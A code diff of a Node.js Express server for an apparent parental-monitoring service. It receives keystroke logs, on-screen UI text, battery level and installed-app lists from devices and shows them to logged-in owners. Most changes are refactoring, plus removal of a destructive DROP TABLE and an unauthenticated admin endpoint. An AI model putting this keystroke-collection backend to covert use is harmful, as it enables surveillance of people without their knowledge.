@@ -42,10 +42,8 @@ async function setupDatabase() {
 
     await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS role VARCHAR(20) DEFAULT 'parent'`);
 
-    await pool.query(`DROP TABLE IF EXISTS devices CASCADE;`);
-
     await pool.query(`
-      CREATE TABLE devices (
+      CREATE TABLE IF NOT EXISTS devices (
         id SERIAL PRIMARY KEY,
         owner_user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
         device_id VARCHAR(255) UNIQUE NOT NULL,
@@ -57,6 +55,10 @@ async function setupDatabase() {
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       );
     `);
+
+    await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_id VARCHAR(255)`);
+    await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_token TEXT`);
+    await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS owner_user_id INTEGER`);
 
     console.log("Database ready.");
   } catch (err) {
@@ -70,7 +72,6 @@ function requireLogin(req, res, next) {
   next();
 }
 
-// ================= AUTH =================
 app.post("/api/signup", async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -90,10 +91,7 @@ app.post("/api/signup", async (req, res) => {
       if (err) return res.status(500).json({ error: "Session save failed." });
       res.status(201).json({ message: "Account created.", user: result.rows[0] });
     });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Signup failed." });
-  }
+  } catch (e) { console.error(e); res.status(500).json({ error: "Signup failed." }); }
 });
 
 app.post("/api/login", async (req, res) => {
@@ -112,10 +110,7 @@ app.post("/api/login", async (req, res) => {
       if (err) return res.status(500).json({ error: "Session save failed." });
       res.json({ message: "Login successful.", user: { id: user.id, email: user.email, role: user.role } });
     });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Login failed." });
-  }
+  } catch (e) { console.error(e); res.status(500).json({ error: "Login failed." }); }
 });
 
 app.get("/api/me", requireLogin, async (req, res) => {
@@ -123,12 +118,10 @@ app.get("/api/me", requireLogin, async (req, res) => {
     const result = await pool.query("SELECT id, email, role, created_at FROM users WHERE id=$1", [req.session.userId]);
     if (result.rows.length === 0) return res.status(401).json({ authenticated: false });
     res.json({ authenticated: true, user: result.rows[0] });
-  } catch (e) {
-    res.status(500).json({ error: "Failed to fetch user." });
-  }
+  } catch (e) { res.status(500).json({ error: "Failed to fetch user." }); }
 });
 
-// ================= DEVICE STATE (Upsert) =================
+// Device state upsert
 const deviceStates = new Map();
 const keylogs = [];
 const deviceUIs = new Map();
@@ -136,14 +129,10 @@ const deviceUIs = new Map();
 app.post("/api/device-state", async (req, res) => {
   try {
     const { ownerEmail, deviceId, deviceToken, deviceName, battery, installedApps } = req.body;
-    if (!ownerEmail || !deviceId || !deviceToken) {
-      return res.status(400).json({ error: "ownerEmail, deviceId, deviceToken required" });
-    }
+    if (!ownerEmail || !deviceId || !deviceToken) return res.status(400).json({ error: "ownerEmail, deviceId, deviceToken required" });
 
     const userRes = await pool.query("SELECT id FROM users WHERE email=$1", [ownerEmail.toLowerCase().trim()]);
-    if (userRes.rows.length === 0) {
-      return res.status(404).json({ error: "User not found" });
-    }
+    if (userRes.rows.length === 0) return res.status(404).json({ error: "User not found" });
     const userId = userRes.rows[0].id;
 
     const existing = await pool.query("SELECT id FROM devices WHERE device_id=$1", [deviceId]);
@@ -165,23 +154,17 @@ app.post("/api/device-state", async (req, res) => {
       installedApps: installedApps || [],
       last_seen: Date.now()
     });
-
     res.json({ success: true });
-  } catch (e) {
-    console.error("Device state error:", e);
-    res.status(500).json({ error: "State update failed" });
-  }
+  } catch (e) { console.error(e); res.status(500).json({ error: "State update failed" }); }
 });
 
 app.get("/api/device-state", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
   if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
     return res.status(403).json({ error: "Not your device." });
   }
-
   const live = deviceStates.get(deviceId);
   if (!live) return res.json({ deviceName: "Unknown", battery: 0, installedApps: [], last_seen: 0 });
   res.json(live);
@@ -204,54 +187,36 @@ app.get("/api/devices", requireLogin, async (req, res) => {
       return row;
     });
     res.json(devices);
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Failed to load devices." });
-  }
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to load devices." }); }
 });
 
-// ================= KEYLOGGER & UI =================
 app.post("/api/keylog", async (req, res) => {
   try {
     const { deviceId, deviceToken, text, timestamp } = req.body;
     if (!deviceId || !deviceToken || !text) return res.status(400).json({ error: "deviceId, deviceToken and text required" });
-
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
-      return res.status(401).json({ error: "Invalid device token." });
-    }
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
     keylogs.push({ deviceId, text, timestamp: timestamp || Date.now() });
     res.json({ success: true });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Failed to save keylog." });
-  }
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save keylog." }); }
 });
 
 app.post("/api/ui", async (req, res) => {
   try {
     const { deviceId, deviceToken, uiText, timestamp } = req.body;
     if (!deviceId || !deviceToken) return res.status(400).json({ error: "deviceId and deviceToken required" });
-
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
-      return res.status(401).json({ error: "Invalid device token." });
-    }
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
     deviceUIs.set(deviceId, { uiText, timestamp: timestamp || Date.now() });
     res.json({ success: true });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Failed to save UI." });
-  }
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save UI." }); }
 });
 
 app.get("/api/keylog", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
-    return res.status(403).json({ error: "Not your device." });
-  }
+  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) return res.status(403).json({ error: "Not your device." });
   res.json(keylogs.filter(k => k.deviceId === deviceId));
 });
 
@@ -259,35 +224,17 @@ app.get("/api/ui", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
-    return res.status(403).json({ error: "Not your device." });
-  }
+  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) return res.status(403).json({ error: "Not your device." });
   res.json(deviceUIs.get(deviceId) || { uiText: "", timestamp: 0 });
 });
 
-// ================= ADMIN =================
-app.get("/api/admin/stats", async (req, res) => {
-  try {
-    const totalUsers = await pool.query("SELECT COUNT(*) FROM users");
-    const totalDevices = await pool.query("SELECT COUNT(*) FROM devices");
-    res.json({ totalUsers: totalUsers.rows[0].count, totalDevices: totalDevices.rows[0].count });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Admin stats failed." });
-  }
-});
-
-// ================= PAGES =================
 app.get("/control.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
 app.get("/control", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
 app.get("/dashboard.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "dashboard.html")));
 app.get("/dashboard", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "dashboard.html")));
 app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));
 app.post("/api/logout", (req, res) => {
-  req.session.destroy(() => {
-    res.clearCookie("connect.sid");
-    res.json({ message: "Logged out." });
-  });
+  req.session.destroy(() => { res.clearCookie("connect.sid"); res.json({ message: "Logged out." }); });
 });
 
 app.listen(PORT, "0.0.0.0", () => console.log(`Server running on port ${PORT}`));
